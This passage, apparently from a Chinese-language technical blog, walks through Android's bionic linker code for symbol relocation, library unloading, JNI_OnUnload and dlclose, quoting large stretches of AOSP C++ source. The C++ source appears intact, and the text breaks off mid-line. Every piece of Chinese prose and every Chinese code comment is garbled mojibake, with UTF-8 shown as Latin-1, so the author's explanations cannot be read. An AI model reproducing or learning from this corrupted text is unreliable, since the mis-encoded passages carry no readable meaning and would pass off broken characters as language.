æ¥æŸ¥æ‰¾ç¬¦å· template &lt;RelocMode Mode>__attribute__((always_inline))static bool process_relocation_impl(Relocator&amp; relocator, const rel_t&amp; reloc) &#123; constexpr bool IsGeneral = Mode == RelocMode::General; void* const rel_target = reinterpret_cast&lt;void*>(reloc.r_offset + relocator.si->load_bias); const uint32_t r_type = ELFW(R_TYPE)(reloc.r_info); const uint32_t r_sym = ELFW(R_SYM)(reloc.r_info); soinfo* found_in = nullptr; const ElfW(Sym)* sym = nullptr; const char* sym_name = nullptr; ElfW(Addr) sym_addr = 0; if (r_sym != 0) &#123; // è·å–é‡å®šå‘çš„ç¬¦å·å sym_name = relocator.get_string(relocator.si_symtab[r_sym].st_name); &#125; ...#if defined(USE_RELA) auto get_addend_rel = [&amp;]() -> ElfW(Addr) &#123; return reloc.r_addend; &#125;; auto get_addend_norel = [&amp;]() -> ElfW(Addr) &#123; return reloc.r_addend; &#125;;#else auto get_addend_rel = [&amp;]() -> ElfW(Addr) &#123; return *static_cast&lt;ElfW(Addr)*>(rel_target); &#125;; auto get_addend_norel = [&amp;]() -> ElfW(Addr) &#123; return 0; &#125;;#endif if (IsGeneral &amp;&amp; is_tls_reloc(r_type)) &#123; ... &#125; else &#123; if (r_sym == 0) &#123; // Do nothing. &#125; else &#123; // åˆ©ç”¨ lookup_symbol æ¥æŸ¥æ‰¾ç¬¦å· if (!lookup_symbol&lt;IsGeneral>(relocator, r_sym, sym_name, &amp;found_in, &amp;sym)) return false; if (sym != nullptr) &#123; const bool should_protect_segments = handle_text_relocs &amp;&amp; found_in == relocator.si &amp;&amp; ELF_ST_TYPE(sym->st_info) == STT_GNU_IFUNC; if (should_protect_segments &amp;&amp; !protect_segments()) return false; sym_addr = found_in->resolve_symbol_address(sym); if (should_protect_segments &amp;&amp; !unprotect_segments()) return false; &#125; else if constexpr (IsGeneral) &#123; // A weak reference to an undefined symbol. We typically use a zero symbol address, but // use the relocation base for PC-relative relocations, so that the value written is zero. switch (r_type) &#123;#if defined(__x86_64__) case R_X86_64_PC32: sym_addr = reinterpret_cast&lt;ElfW(Addr)>(rel_target); break;#elif defined(__i386__) case R_386_PC32: sym_addr = reinterpret_cast&lt;ElfW(Addr)>(rel_target); break;#endif &#125; &#125; &#125; &#125; // å¤§éƒ¨åˆ†ç¬¦å·çš„ç±»å‹éƒ½æ˜¯ R_GENERIC_JUMP_SLOT if constexpr (IsGeneral || Mode == RelocMode::JumpTable) &#123; if (r_type == R_GENERIC_JUMP_SLOT) &#123; count_relocation_if&lt;IsGeneral>(kRelocAbsolute); const ElfW(Addr) result = sym_addr + get_addend_norel(); trace_reloc(\"RELO JMP_SLOT %16p &lt;- %16p %s\", rel_target, reinterpret_cast&lt;void*>(result), sym_name); *static_cast&lt;ElfW(Addr)*>(rel_target) = result; return true; &#125; &#125; å…¶ä»–ç±»å‹æˆ–æ¶æ„çš„ç›¸å…³é‡å®šå‘è®¡ç®—çœç•¥ ...&#125;åœ¨ lookup_symbol ä¸­è°ƒç”¨äº† soinfo_do_lookup æ¥æŸ¥æ‰¾ç¬¦å· template &lt;bool DoLogging>__attribute__((always_inline))static inline bool lookup_symbol(Relocator&amp; relocator, uint32_t r_sym, const char* sym_name, soinfo** found_in, const ElfW(Sym)** sym) &#123; //relocator æ˜¯å‰é¢ä¼ è¿›æ¥åŒ…å«å…¨å±€ç»„å’Œæœ¬åœ°ç»„çš„ soinfosï¼Œå…¨å±€ç»„æ’åœ¨æœ€å‰é¢ // å¦‚æœä¸Šä¸€æ¬¡å·²ç»æŸ¥æ‰¾è¿‡è¿™ä¸ªç¬¦å·ï¼Œé‚£ä¹ˆä¹…æ²¡æœ‰å¿…è¦å†æŸ¥æ‰¾ä¸€æ¬¡ if (r_sym == relocator.cache_sym_val) &#123; *found_in = relocator.cache_si; *sym = relocator.cache_sym; count_relocation_if&lt;DoLogging>(kRelocSymbolCached); &#125; else &#123; const version_info* vi = nullptr; if (!relocator.si->lookup_version_info(relocator.version_tracker, r_sym, sym_name, &amp;vi)) &#123; return false; &#125; soinfo* local_found_in = nullptr; // æœ€ç»ˆè°ƒç”¨ soinfo_do_lookup æ¥æŸ¥æ‰¾ç¬¦å· const ElfW(Sym)* local_sym = soinfo_do_lookup(sym_name, vi, &amp;local_found_in, relocator.lookup_list); relocator.cache_sym_val = r_sym; relocator.cache_si = local_found_in; relocator.cache_sym = local_sym; *found_in = local_found_in; *sym = local_sym; &#125; if (*sym == nullptr) &#123; if (ELF_ST_BIND(relocator.si_symtab[r_sym].st_info) != STB_WEAK) &#123; DL_ERR(\"cannot locate symbol \\\"%s\\\" referenced by \\\"%s\\\"...\", sym_name, relocator.si->get_realpath()); return false; &#125; &#125; count_relocation_if&lt;DoLogging>(kRelocSymbol); return true;&#125;åœ¨ soinfo_do_lookup ä¸­æœ€ç»ˆè°ƒç”¨æ¨¡æ¿å‡½æ•° soinfo_do_lookup_impl è¿›è¡Œç¬¦å·æŸ¥æ‰¾ //android-platform\\bionic\\linker\\linker_soinfo.cppconst ElfW(Sym)* soinfo_do_lookup(const char* name, const version_info* vi, soinfo** si_found_in, const SymbolLookupList&amp; lookup_list) &#123; return lookup_list.needs_slow_path() ? soinfo_do_lookup_impl&lt;true>(name, vi, si_found_in, lookup_list) : soinfo_do_lookup_impl&lt;false>(name, vi, si_found_in, lookup_list);&#125;æœ‰ hash è¡¨æŸ¥ hash è¡¨ï¼Œæ²¡ hash è¡¨ç”¨ç¬¦å·æŸ¥æ‰¾ template &lt;bool IsGeneral>__attribute__((noinline)) static const ElfW(Sym)*soinfo_do_lookup_impl(const char* name, const version_info* vi, soinfo** si_found_in, const SymbolLookupList&amp; lookup_list) &#123; const auto [ hash, name_len ] = calculate_gnu_hash(name); constexpr uint32_t kBloomMaskBits = sizeof(ElfW(Addr)) * 8; SymbolName elf_symbol_name(name); const SymbolLookupLib* end = lookup_list.end(); const SymbolLookupLib* it = lookup_list.begin(); while (true) &#123; const SymbolLookupLib* lib; uint32_t sym_idx; // Iterate over libraries until we find one whose Bloom filter matches the symbol we're // searching for. // åœ¨æ¯ä¸€ä¸ªåº“ä¸­éƒ½å»å¯»æ‰¾æœ‰æ²¡æœ‰æŒ‡å®šçš„ç¬¦å· while (true) &#123; if (it == end) return nullptr; lib = it++; // è¦æ˜¯æ²¡æœ‰ hash è¡¨ï¼Œå°±é€šè¿‡åç§°æ¥è¿›è¡ŒæŸ¥æ‰¾ if (IsGeneral &amp;&amp; lib->needs_sysv_lookup()) &#123; if (const ElfW(Sym)* sym = lib->si_->find_symbol_by_name(elf_symbol_name, vi)) &#123; *si_found_in = lib->si_; return sym; &#125; continue; &#125; if (IsGeneral) &#123; TRACE_TYPE(LOOKUP, \"SEARCH %s in %s@%p (gnu)\", name, lib->si_->get_realpath(), reinterpret_cast&lt;void*>(lib->si_->base)); &#125; // è®¡ç®—ç¬¦å· hash æ¡¶æŸ¥è¯¢é“¾ const uint32_t word_num = (hash / kBloomMaskBits) &amp; lib->gnu_maskwords_; const ElfW(Addr) bloom_word = lib->gnu_bloom_filter_[word_num]; const uint32_t h1 = hash % kBloomMaskBits; const uint32_t h2 = (hash >> lib->gnu_shift2_) % kBloomMaskBits; if ((1 &amp; (bloom_word >> h1) &amp; (bloom_word >> h2)) == 1) &#123; sym_idx = lib->gnu_bucket_[hash % lib->gnu_nbucket_]; if (sym_idx != 0) &#123; break; &#125; &#125; if (IsGeneral) &#123; TRACE_TYPE(LOOKUP, \"NOT FOUND %s in %s@%p\", name, lib->si_->get_realpath(), reinterpret_cast&lt;void*>(lib->si_->base)); &#125; &#125; // Search the library's hash table chain. ElfW(Versym) verneed = kVersymNotNeeded; bool calculated_verneed = false; uint32_t chain_value = 0; const ElfW(Sym)* sym = nullptr; //// æ ¹æ®ç¬¦å· hash å¿«é€ŸæŸ¥æ‰¾ do &#123; sym = lib->symtab_ + sym_idx; chain_value = lib->gnu_chain_[sym_idx]; if ((chain_value >> 1) == (hash >> 1)) &#123; if (vi != nullptr &amp;&amp; !calculated_verneed) &#123; calculated_verneed = true; verneed = find_verdef_version_index(lib->si_, vi); &#125; if (check_symbol_version(lib->versym_, sym_idx, verneed) &amp;&amp; static_cast&lt;size_t>(sym->st_name) + name_len + 1 &lt;= lib->strtab_size_ &amp;&amp; memcmp(lib->strtab_ + sym->st_name, name, name_len + 1) == 0 &amp;&amp; is_symbol_global_and_defined(lib->si_, sym)) &#123; *si_found_in = lib->si_; if (IsGeneral) &#123; TRACE_TYPE(LOOKUP, \"FOUND %s in %s (%p) %zd\", name, lib->si_->get_realpath(), reinterpret_cast&lt;void*>(sym->st_value), static_cast&lt;size_t>(sym->st_size)); &#125; return sym; &#125; &#125; ++sym_idx; &#125; while ((chain_value &amp; 1) == 0); if (IsGeneral) &#123; TRACE_TYPE(LOOKUP, \"NOT FOUND %s in %s@%p\", name, lib->si_->get_realpath(), reinterpret_cast&lt;void*>(lib->si_->base)); &#125; &#125;&#125;# æ”¶å°¾å·¥ä½œ å¯¹ä¾èµ–åº“çš„é“¾æ¥æƒ…å†µè¿›è¡Œæ ‡è®°ï¼Œå¹¶å¢åŠ ä¾èµ–åº“çš„å¼•ç”¨è®¡æ•° // Step 7: Mark all load_tasks as linked and increment refcounts // for references between load_groups (at this point it does not matter if // referenced load_groups were loaded by previous dlopen or as part of this // one on step 6) if (start_with != nullptr &amp;&amp; add_as_children) &#123; start_with->set_linked(); &#125; for (auto&amp;&amp; task : load_tasks) &#123; soinfo* si = task->get_soinfo(); si->set_linked(); &#125; for (auto&amp;&amp; task : load_tasks) &#123; soinfo* si = task->get_soinfo(); soinfo* needed_by = task->get_needed_by(); if (needed_by != nullptr &amp;&amp; needed_by != start_with &amp;&amp; needed_by->get_local_group_root() != si->get_local_group_root()) &#123; // å¢åŠ ä¾èµ–åº“ so çš„å¼•ç”¨è®¡æ•° si->increment_ref_count(); &#125; &#125;è‡³æ­¤ä¸ºæ­¢ï¼Œä¸€ä¸ª so å°±è¢«æˆåŠŸçš„åŠ è½½è¿›æ¥äº†ï½ # so çš„å¸è½½è¿‡ç¨‹ åœ¨ android ä¸­å¹¶æ²¡æœ‰ç›´æ¥çš„æ¥å£æ¥è®©å¼€å‘è€…å¸è½½ä¸€ä¸ª so, æ‰€ä»¥å¯¹äº so çš„å¸è½½è¿‡ç¨‹æˆ‘ä»¬æ— æ³•ä½¿ç”¨è‡ªä¸Šè€Œä¸‹çš„æ–¹å¼å»åˆ†æï¼Œä½†å¯ä»¥åˆ©ç”¨é€†å‘çš„æ–¹æ³•ï¼Œè‡ªåº•å‘ä¸Šä¸€æ­¥ä¸€æ­¥æ¢ç´¢ so çš„å¸è½½è¿‡ç¨‹ç©¶ç«Ÿæ˜¯ä»€ä¹ˆæ ·å­çš„ é¦–å…ˆæ•´ç†ä¸€ä¸‹ç›®å‰ä¸ºæ­¢ä» AOSP æºç ä»¥åŠç½‘ä¸Šæ‰¾çš„çº¿ç´¢: android çš„ so ä¸­æœ‰ä¸€ä¸ªç‹¬ç‰¹çš„å‡½æ•° JNI_OnUnload , å½“ so å¸è½½æ—¶ä¼šè¿›è¡Œè°ƒç”¨ åœ¨ AOSP çš„ platform\\bionic\\linker\\linker_soinfo.cpp ä¸­æœ‰ä¸€ä¸ªå‡½æ•° call_destructors , å®ƒçš„å®Œæ•´ä»£ç å¦‚ä¸‹ //platform\\bionic\\linker\\linker_soinfo.cppvoid soinfo::call_destructors() &#123; if (!constructors_called) &#123; return; &#125; ScopedTrace trace((std::string(\"calling destructors: \") + get_realpath()).c_str()); // DT_FINI_ARRAY must be parsed in reverse order. call_array(\"DT_FINI_ARRAY\", fini_array_, fini_array_count_, true, get_realpath()); // DT_FINI should be called after DT_FINI_ARRAY if both are present. call_function(\"DT_FINI\", fini_func_, get_realpath());&#125;å½“è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œä¼šå…ˆè°ƒç”¨ final_array ä¸­çš„å‡½æ•°ï¼Œæœ€åè°ƒç”¨ final å‡½æ•° (æ€ä¹ˆå’Œ init ä¸ init_array åè¿‡æ¥äº†) é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æå‡ºä»¥ä¸‹ä¸¤ä¸ªé—®é¢˜ï¼Œæ¥ä¸ºé€†å‘åˆ†æçš„è¿‡ç¨‹æ˜ç¡®ä¸€ä¸ªæ¸…æ™°çš„ç›®æ ‡ åœ¨ä»€ä¹ˆæƒ…å†µä¸‹ JNI_OnUnload ä¸ call_destructors ä¼šè¢«è°ƒç”¨ï¼Ÿ JNI_OnUnload å’Œ call_destructors è°ƒç”¨çš„å…ˆåé¡ºåºæ˜¯ä»€ä¹ˆï¼Ÿ å¸¦ç€è¿™ä¸¤ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬é¦–å…ˆå¯¹ JNI_OnUnload è¿›è¡Œåˆ†æ # JNI_OnUnload # UnloadLibraries android ä¸­å­˜åœ¨ä¸€ä¸ªç‰¹æœ‰çš„å‡½æ•° JNI_OnUnload , å½“è™šæ‹Ÿæœºé‡Šæ”¾è¯¥ so æ—¶ï¼Œæ¥è¿›è¡Œå–„åæ¸…é™¤åŠ¨ä½œï¼Œé€šè¿‡åœ¨ android å®˜ç½‘æºç æœç´¢å¹³å°ç¿»äº†å¥½å¤šé¡µçš„æœç´¢ç»“æœï¼Œç»ˆäºæ‰¾åˆ°äº† JNI_OnUnload çš„è°ƒç”¨å‡½æ•°ï¼Œä»–åœ¨ art/runtime/jni/java_vm_ext.cc ä¸­çš„ UnloadLibraries ä¸­è¢«è°ƒç”¨ //platform\\art\\runtime\\jni\\java_vm_ext.ccstatic void UnloadLibraries(JavaVM* vm, const std::vector&lt;SharedLibrary*>&amp; libraries) &#123; using JNI_OnUnloadFn = void(*)(JavaVM*, void*); for (SharedLibrary* library : libraries) &#123; void* const sym = library->FindSymbol(\"JNI_OnUnload\", nullptr, android::kJNICallTypeRegular); if (sym == nullptr) &#123; VLOG(jni) &lt;&lt; \"[No JNI_OnUnload found in \\\"\" &lt;&lt; library->GetPath() &lt;&lt; \"\\\"]\"; &#125; else &#123; VLOG(jni) &lt;&lt; \"[JNI_OnUnload found for \\\"\" &lt;&lt; library->GetPath() &lt;&lt; \"\\\"]: Calling...\"; JNI_OnUnloadFn jni_on_unload = reinterpret_cast&lt;JNI_OnUnloadFn>(sym); jni_on_unload(vm, nullptr); &#125; &#125;&#125;# UnloadNativeLibraries å†å»çœ‹ä¸€ä¸‹ UnloadLibraries çš„å¼•ç”¨ï¼Œå®ƒåœ¨ UnloadNativeLibraries è¢«è°ƒç”¨ //platform\\art\\runtime\\jni\\java_vm_ext.cc// Unload native libraries with cleared class loaders.void UnloadNativeLibraries() REQUIRES(!Locks::jni_libraries_lock_) REQUIRES_SHARED(Locks::mutator_lock_) &#123; Thread* const self = Thread::Current(); std::vector&lt;SharedLibrary*> unload_libraries; &#123; MutexLock mu(self, *Locks::jni_libraries_lock_); for (auto it = libraries_.begin(); it != libraries_.end(); ) &#123; SharedLibrary* const library = it->second; // If class loader is null then it was unloaded, call JNI_OnUnload. const jweak class_loader = library->GetClassLoader(); // If class_loader is a null jobject then it is the boot class loader. We should not unload // the native libraries of the boot class loader. if (class_loader != nullptr &amp;&amp; self->IsJWeakCleared(class_loader)) &#123; unload_libraries.push_back(library); it = libraries_.erase(it); &#125; else &#123; ++it; &#125; &#125; &#125; ScopedThreadSuspension sts(self, kNative); // Do this without holding the jni libraries lock to prevent possible deadlocks. // è°ƒç”¨ so ä¸­çš„ JNI_OnUnload UnloadLibraries(self->GetJniEnv()->GetVm(), unload_libraries); for (auto library : unload_libraries) &#123; delete library; &#125;&#125;# JavaVMExt::UnloadNativeLibraries è¿™é‡Œè°ƒç”¨äº† libraries_ ä¸­çš„ UnloadNativeLibraries å‡½æ•°ï¼Œçœ‹èµ·æ¥å¸è½½çš„è¿‡ç¨‹å’Œ Java è™šæ‹Ÿæœºæœ‰äº›è®¸çš„å…³ç³» //platform\\art\\runtime\\jni\\java_vm_ext.ccvoid JavaVMExt::UnloadNativeLibraries() &#123; libraries_.get()->UnloadNativeLibraries();&#125;# Heap::CollectGarbageInternal JavaVMExt::UnloadNativeLibraries åœ¨ Heap::CollectGarbageInternal çš„æœ«å°¾è¢«è°ƒç”¨ è¿™å‡½æ•°çœ‹èµ·æ¥å’Œè™šæ‹Ÿæœºå †æ‰§è¡Œåƒåœ¾å›æ”¶æœ‰å…³ï¼Œåƒåœ¾å›æ”¶æ‰§è¡Œå®Œæ¯•åä¼šå»è°ƒç”¨ JNI_OnUnload ç„¶è€Œå†å¾€ä¸Šå¯»æ‰¾å´æ‰¾ä¸åˆ°ä»€ä¹ˆæœ‰ç”¨çš„å‡½æ•°äº†ï¼Œæˆ‘ä»¬åªçŸ¥é“åœ¨ JVM åƒåœ¾å›æ”¶ä¹‹åä¼šå»è°ƒç”¨ JNI_OnUnload //platform\\art\\runtime\\gc\\heap.cccollector::GcType Heap::CollectGarbageInternal(collector::GcType gc_type, GcCause gc_cause, bool clear_soft_references, uint32_t requested_gc_num) &#123; Thread* self = Thread::Current(); Runtime* runtime = Runtime::Current(); // If the heap can't run the GC, silently fail and return that no GC was run. switch (gc_type) &#123; case collector::kGcTypePartial: &#123; if (!HasZygoteSpace()) &#123; // Do not increment gcs_completed_ . We should retry with kGcTypeFull. return collector::kGcTypeNone; &#125; break; &#125; default: &#123; // Other GC types don't have any special cases which makes them not runnable. The main case // here is full GC. &#125; &#125; ScopedThreadStateChange tsc(self, kWaitingPerformingGc); Locks::mutator_lock_->AssertNotHeld(self); if (self->IsHandlingStackOverflow()) &#123; // If we are throwing a stack overflow error we probably don't have enough remaining stack // space to run the GC. // Count this as a GC in case someone is waiting for it to complete. gcs_completed_.fetch_add(1, std::memory_order_release); return collector::kGcTypeNone; &#125; bool compacting_gc; &#123; gc_complete_lock_->AssertNotHeld(self); ScopedThreadStateChange tsc2(self, kWaitingForGcToComplete); MutexLock mu(self, *gc_complete_lock_); // Ensure there is only one GC at a time. WaitForGcToCompleteLocked(gc_cause, self); if (requested_gc_num != GC_NUM_ANY &amp;&amp; !GCNumberLt(GetCurrentGcNum(), requested_gc_num)) &#123; // The appropriate GC was already triggered elsewhere. return collector::kGcTypeNone; &#125; compacting_gc = IsMovingGc(collector_type_); // GC can be disabled if someone has a used GetPrimitiveArrayCritical. if (compacting_gc &amp;&amp; disable_moving_gc_count_ != 0) &#123; LOG(WARNING) &lt;&lt; \"Skipping GC due to disable moving GC count \" &lt;&lt; disable_moving_gc_count_; // Again count this as a GC. gcs_completed_.fetch_add(1, std::memory_order_release); return collector::kGcTypeNone; &#125; if (gc_disabled_for_shutdown_) &#123; gcs_completed_.fetch_add(1, std::memory_order_release); return collector::kGcTypeNone; &#125; collector_type_running_ = collector_type_; last_gc_cause_ = gc_cause; &#125; if (gc_cause == kGcCauseForAlloc &amp;&amp; runtime->HasStatsEnabled()) &#123; ++runtime->GetStats()->gc_for_alloc_count; ++self->GetStats()->gc_for_alloc_count; &#125; const size_t bytes_allocated_before_gc = GetBytesAllocated(); DCHECK_LT(gc_type, collector::kGcTypeMax); DCHECK_NE(gc_type, collector::kGcTypeNone); collector::GarbageCollector* collector = nullptr; // TODO: Clean this up. if (compacting_gc) &#123; DCHECK(current_allocator_ == kAllocatorTypeBumpPointer || current_allocator_ == kAllocatorTypeTLAB || current_allocator_ == kAllocatorTypeRegion || current_allocator_ == kAllocatorTypeRegionTLAB); switch (collector_type_) &#123; case kCollectorTypeSS: semi_space_collector_->SetFromSpace(bump_pointer_space_); semi_space_collector_->SetToSpace(temp_space_); semi_space_collector_->SetSwapSemiSpaces(true); collector = semi_space_collector_; break; case kCollectorTypeCC: collector::ConcurrentCopying* active_cc_collector; if (use_generational_cc_) &#123; // TODO: Other threads must do the flip checkpoint before they start poking at // active_concurrent_copying_collector_. So we should not concurrency here. active_cc_collector = (gc_type == collector::kGcTypeSticky) ? young_concurrent_copying_collector_ : concurrent_copying_collector_; active_concurrent_copying_collector_.store(active_cc_collector, std::memory_order_relaxed); DCHECK(active_cc_collector->RegionSpace() == region_space_); collector = active_cc_collector; &#125; else &#123; collector = active_concurrent_copying_collector_.load(std::memory_order_relaxed); &#125; break; default: LOG(FATAL) &lt;&lt; \"Invalid collector type \" &lt;&lt; static_cast&lt;size_t>(collector_type_); &#125; if (collector != active_concurrent_copying_collector_.load(std::memory_order_relaxed)) &#123; temp_space_->GetMemMap()->Protect(PROT_READ | PROT_WRITE); if (kIsDebugBuild) &#123; // Try to read each page of the memory map in case mprotect didn't work properly b/19894268. temp_space_->GetMemMap()->TryReadable(); &#125; CHECK(temp_space_->IsEmpty()); &#125; gc_type = collector::kGcTypeFull; // TODO: Not hard code this in. &#125; else if (current_allocator_ == kAllocatorTypeRosAlloc || current_allocator_ == kAllocatorTypeDlMalloc) &#123; collector = FindCollectorByGcType(gc_type); &#125; else &#123; LOG(FATAL) &lt;&lt; \"Invalid current allocator \" &lt;&lt; current_allocator_; &#125; CHECK(collector != nullptr) &lt;&lt; \"Could not find garbage collector with collector_type=\" &lt;&lt; static_cast&lt;size_t>(collector_type_) &lt;&lt; \" and gc_type=\" &lt;&lt; gc_type; collector->Run(gc_cause, clear_soft_references || runtime->IsZygote()); IncrementFreedEver(); RequestTrim(self); // Collect cleared references. SelfDeletingTask* clear = reference_processor_->CollectClearedReferences(self); // Grow the heap so that we know when to perform the next GC. GrowForUtilization(collector, bytes_allocated_before_gc); old_native_bytes_allocated_.store(GetNativeBytes()); LogGC(gc_cause, collector); FinishGC(self, gc_type); // Actually enqueue all cleared references. Do this after the GC has officially finished since // otherwise we can deadlock. clear->Run(self); clear->Finalize(); // Inform DDMS that a GC completed. Dbg::GcDidFinish(); // Unload native libraries for class unloading. We do this after calling FinishGC to prevent // deadlocks in case the JNI_OnUnload function does allocations. &#123; ScopedObjectAccess soa(self); // è°ƒç”¨ JNI_OnUnload soa.Vm()->UnloadNativeLibraries(); &#125; return gc_type;&#125;# call_destructors call_destructors å‡½æ•°å¦‚ä¸‹ï¼Œæˆ‘ä»¬å‘ä¸Šæ‰¾æ‰¾çœ‹äº¤å‰å¼•ç”¨ //platform\\bionic\\linker\\linker_soinfo.cppvoid soinfo::call_destructors() &#123; if (!constructors_called) &#123; return; &#125; ScopedTrace trace((std::string(\"calling destructors: \") + get_realpath()).c_str()); // DT_FINI_ARRAY must be parsed in reverse order. call_array(\"DT_FINI_ARRAY\", fini_array_, fini_array_count_, true, get_realpath()); // DT_FINI should be called after DT_FINI_ARRAY if both are present. call_function(\"DT_FINI\", fini_func_, get_realpath());&#125;# soinfo_unload_impl è¿™é‡Œæˆ‘ä»¬å‘ç° log ä»£ç ä¸­éƒ½å‡ºç°äº† dlclose å­—æ ·ï¼Œé‚£ä¹ˆæ˜¾è€Œæ˜“è§è¿™åº”è¯¥å’Œ dlclose è„±ä¸äº†å¹²ç³»ï¼Œåœ¨å¾€ä¸Šçœ‹çœ‹ //platform\\bionic\\linker\\linker.cppstatic void soinfo_unload_impl(soinfo* root) &#123; ScopedTrace trace((std::string(\"unload \") + root->get_realpath()).c_str()); bool is_linked = root->is_linked(); if (!root->can_unload()) &#123; LD_LOG(kLogDlopen, \"... dlclose(root=\\\"%s\\\"@%p) ... not unloading - the load group is flagged with NODELETE\", root->get_realpath(), root); return; &#125; soinfo_list_t unload_list; unload_list.push_back(root); soinfo_list_t local_unload_list; soinfo_list_t external_unload_list; soinfo* si = nullptr; // å°†è¦å¸è½½çš„ so çš„ soinfo æ·»åŠ åˆ° local_unload_list ä¸­ while ((si = unload_list.pop_front()) != nullptr) &#123; if (local_unload_list.contains(si)) &#123; continue; &#125; local_unload_list.push_back(si); if (si->has_min_version(0)) &#123; soinfo* child = nullptr; while ((child = si->get_children().pop_front()) != nullptr) &#123; TRACE(\"%s@%p needs to unload %s@%p\", si->get_realpath(), si, child->get_realpath(), child); child->get_parents().remove(si); if (local_unload_list.contains(child)) &#123; continue; &#125; else if (child->is_linked() &amp;&amp; child->get_local_group_root() != root) &#123; external_unload_list.push_back(child); &#125; else if (child->get_parents().empty()) &#123; unload_list.push_back(child); &#125; &#125; &#125; else &#123; async_safe_fatal(\"soinfo for \\\"%s\\\"@%p has no version\", si->get_realpath(), si); &#125; &#125; local_unload_list.for_each([](soinfo* si) &#123; LD_LOG(kLogDlopen, \"... dlclose: calling destructors for \\\"%s\\\"@%p ... \", si->get_realpath(), si); // è°ƒç”¨ call_destructors æ‰§è¡Œ final_array å’Œ final å‡½æ•° si->call_destructors(); LD_LOG(kLogDlopen, \"... dlclose: calling destructors for \\\"%s\\\"@%p ... done\", si->get_realpath(), si); &#125;); // è¿›è¡Œ soinfo æœ€åçš„æ”¶å°¾å·¥ä½œ while ((si = local_unload_list.pop_front()) != nullptr) &#123; LD_LOG(kLogDlopen, \"... dlclose: unloading \\\"%s\\\"@%p ...\", si->get_realpath(), si); ++g_module_unload_counter; notify_gdb_of_unload(si); unregister_soinfo_tls(si); if (__libc_shared_globals()->unload_hook) &#123; __libc_shared_globals()->unload_hook(si->load_bias, si->phdr, si->phnum); &#125; get_cfi_shadow()->BeforeUnload(si); soinfo_free(si); &#125; if (is_linked) &#123; while ((si = external_unload_list.pop_front()) != nullptr) &#123; LD_LOG(kLogDlopen, \"... dlclose: unloading external reference \\\"%s\\\"@%p ...\", si->get_realpath(), si); soinfo_unload(si); &#125; &#125; else &#123; LD_LOG(kLogDlopen, \"... dlclose: unload_si was not linked - not unloading external references ...\"); &#125;&#125;# soinfo_unload soinfo_unload_impl è¢« soinfo_unload è°ƒç”¨ï¼Œä¸»è¦è®©å¼•ç”¨è®¡æ•°å‡ä¸€ï¼Œç„¶åè°ƒç”¨æ ¸å¿ƒçš„å¸è½½é€»è¾‘ //platform\\bionic\\linker\\linker.cppstatic void soinfo_unload(soinfo* unload_si) &#123; // Note that the library can be loaded but not linked; // in which case there is no root but we still need // to walk the tree and unload soinfos involved. // // This happens on unsuccessful dlopen, when one of // the DT_NEEDED libraries could not be linked/found. // è¿™ä¸ª so ä¸ç®¡æœ‰æ²¡æœ‰è¢«é“¾æ¥ï¼Œåªè¦åŠ è½½äº†ï¼Œé‚£å¿…é¡»å¾— unload å¸è½½ bool is_linked = unload_si->is_linked(); soinfo* root = is_linked ? unload_si->get_local_group_root() : unload_si; LD_LOG(kLogDlopen, \"... dlclose(realpath=\\\"%s\\\"@%p) ... load group root is \\\"%s\\\"@%p\", unload_si->get_realpath(), unload_si, root->get_realpath(), root); // å¦‚æœè¢«å…¶ä»–åº“é“¾æ¥äº† (å…¶å®å°±æ˜¯è¢«å¼•ç”¨äº†), é‚£å¸è½½çš„æ—¶å€™å¼•ç”¨è®¡æ•°å°± - 1 size_t ref_count = is_linked ? root->decrement_ref_count() : 0; if (ref_count > 0) &#123; LD_LOG(kLogDlopen, \"... dlclose(root=\\\"%s\\\"@%p) ... not unloading - decrementing ref_count to %zd\", root->get_realpath(), root, ref_count); return; &#125; // æ‰§è¡Œæ ¸å¿ƒ unload æ“ä½œ soinfo_unload_impl(root);&#125;# do_dlclose æœä¸å…¶ç„¶ï¼Œæ˜¯è°ƒç”¨ do_dlclose æ¥è¿›è¡Œå¸è½½çš„ //platform\\bionic\\linker\\linker.cppint do_dlclose(void* handle) &#123; ScopedTrace trace(\"dlclose\"); ProtectedDataGuard guard; soinfo* si = soinfo_from_handle(handle); if (si == nullptr) &#123; DL_OPEN_ERR(\"invalid handle: %p\", handle); return -1; &#125; LD_LOG(kLogDlopen, \"dlclose(handle=%p, realpath=\\\"%s\\\"@%p) ...\", handle, si->get_realpath(), si); // å¸è½½ soinfo soinfo_unload(si); LD_LOG(kLogDlopen, \"dlclose(handle=%p) ... done\", handle); return 0;&#125;# __loader_dlclose //platform\\bionic\\linker\\dlfcn.cppint __loader_dlclose(void* handle) &#123; ScopedPthreadMutexLocker locker(&amp;g_dl_mutex); int result = do_dlclose(handle); if (result != 0) &#123; __bionic_format_dlerror(\"dlclose failed\", linker_get_error_buffer()); &#125; return result;&#125;# dlclose æœ€ç»ˆæ¥åˆ°äº† dlclose è¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯å› ä¸º dlclose çš„è°ƒç”¨å®åœ¨æ˜¯å¤ªå¤šäº†ï¼Œæˆ‘ä»¬å¾ˆéš¾å»æ‰¾åˆ°ç©¶ç«Ÿæ˜¯å“ªä¸€ä¸ªå‡½æ•°è°ƒç”¨çš„ dlclose æ¥å¯¹è¿™ä¸ª so æ‰§è¡Œæœ€ç»ˆçš„å¸è½½æ“ä½œ //E:\\android-platform\\bionic\\libdl\\libdl.cpp__attribute__((__weak__))int dlclose(void* handle) &#123; return __loader_dlclose(handle);&#125;# æ³¨é‡Šä¸­çš„çŸ›ç›¾ç‚¹ æˆ‘ä»¬å‘å‰çœ‹çœ‹ android å¼€å‘è€…ç•™ç»™æˆ‘ä»¬çš„æ³¨é‡Š //android-platform\\art\\runtime\\jni\\java_vm_ext.ccbool JavaVMExt::LoadNativeLibrary(JNIEnv* env, const std::string&amp; path, jobject class_loader, jclass caller_class, std::string* error_msg) &#123; ... // é˜¶æ®µäºŒï¼šåŠ è½½ so // Open the shared library. Because we're using a full path, the system // doesn't have to search through LD_LIBRARY_PATH. (It may do so to // resolve this library's dependencies though.) // Failures here are expected when java.library.path has several entries // and we have to hunt for the lib. // Below we dlopen but there is no paired dlclose, this would be necessary if we supported // class unloading. Libraries will only be unloaded when the reference count (incremented by // dlopen) becomes zero from dlclose. // Retrieve the library path from the classloader, if necessary. ScopedLocalRef&lt;jstring> library_path(env, GetLibrarySearchPath(env, class_loader)); Locks::mutator_lock_->AssertNotHeld(self); const char* path_str = path.empty() ? nullptr : path.c_str(); bool 